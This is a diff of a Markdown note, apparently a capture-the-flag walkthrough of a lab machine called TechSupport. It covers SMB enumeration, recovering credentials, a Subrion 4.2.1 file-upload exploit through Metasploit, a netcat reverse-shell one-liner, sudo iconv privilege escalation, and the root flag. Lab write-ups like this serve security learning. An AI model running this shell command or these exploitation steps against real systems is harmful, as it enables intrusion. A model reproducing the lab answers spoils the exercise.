@@ -2,35 +2,34 @@
 aliases: []
 sticker: emoji//1f469-200d-1f4bb
 ---
+# ENUMERATION
+---
 
-# TECH\_SUPPORT 1
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 | 139  | SMB     |
 | 445  | SMB     |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 We got `smb` enabled, let's try anonymous login:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411151007.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411151007.png)
 
 There we go, we got an interesting share, let's check the contents inside of it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411151101.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411151101.png)
 
 We got something called `enter.txt`, let's read the contents:
 
@@ -53,7 +52,8 @@ Wordpress creds
 
 We got credentials for the WordPress site, let's check the website:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411151659.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411151659.png)
 
 We can fuzz and we find this:
 
@@ -84,9 +84,11 @@ wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration:
 test                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 161ms]
 ```
 
+
 If we check the `test` directory, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411151834.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411151834.png)
+
 
 In the `wordpress` directory, we can go to `wp-login.php` and test the credentials we got earlier:
 
@@ -94,23 +96,25 @@ In the `wordpress` directory, we can go to `wp-login.php` and test the credentia
 admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411152301.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411152301.png)
 
 They don't work, seems like they are not the credentials for WordPress, other stuff we are missing is the `/subrion` directory, if we try accessing it we get this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411152549.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411152549.png)
 
 There's a redirection, if we follow it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411152610.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411152610.png)
 
 It changes the host, seems weird, what if we try changing it back to the real host:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411152727.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411152727.png)
 
 No response still, seems like we are trying to access an invalid resource, maybe `/subrion/subrion` does not exist, we can try reading `robots.txt` and check if it works, let's change it in the base request:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411153009.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411153009.png)
 
 There we go, it does exist, we got some stuff:
 
@@ -125,9 +129,11 @@ Disallow: /tmp/
 Disallow: /updates/
 ```
 
+
 If we remember the message from `smb`, we can go inside of `panel` and edit the `/subrion` directory, which could mean we can use these credentials inside of the panel:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411153208.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411153208.png)
+
 
 ```
 admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
@@ -135,9 +141,10 @@ admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
 
 But wait, there is something that needs to be done with these still, let's proceed to exploitation.
 
-## EXPLOITATION
 
-***
+
+# EXPLOITATION
+---
 
 ```
 Subrion creds
@@ -146,9 +153,12 @@ admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
 
 ```
 
+
 Let's use CyberChef with the `magic` operation, we can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411153349.png)
+
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411153349.png)
 
 There we go, we got the real password:
 
@@ -156,29 +166,32 @@ There we go, we got the real password:
 admin:Scam2021
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411153512.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411153512.png)
 
 There we go, we got inside of the panel, let's check for an exploit regarding this version of `subrion`, we are dealing with `subrion 4.2.1`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411153614.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411153614.png)
 
 We got `Arbitrary File Upload`, the module is on `metasploit` so we can use it to ensure it works:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411154612.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411154612.png)
 
-There we go, we got the shell, we can migrate to `netcat`
+There we go, we got the shell, we can migrate to `netcat` 
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 9001 >/tmp/f
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411154740.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411154740.png)
 
 There we go, we got our netcat shell, let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
 
 Let's stabilize our shell:
 
@@ -192,13 +205,14 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411154905.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411154905.png)
 
 If we use linpeas, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411155553.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411155553.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411155606.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411155606.png)
+
 
 ```
 scamsite:ImAScammerLOL!123!
@@ -206,7 +220,7 @@ scamsite:ImAScammerLOL!123!
 
 Let's use this credentials in ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411155627.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411155627.png)
 
 Let's check our sudo privileges:
 
@@ -221,19 +235,20 @@ User scamsite may run the following commands on TechSupport:
 
 We can run `iconv`, let's check it on GTFOBins:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411155740.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411155740.png)
 
 Nice, let's read `root.txt`:
+
 
 ```
 sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411160756.png)
-
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411160756.png)
 ```
 scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
 851b8233a8c09400ec30651bd1529bf1ed02790b
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250411160820.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250411160820.png)
+
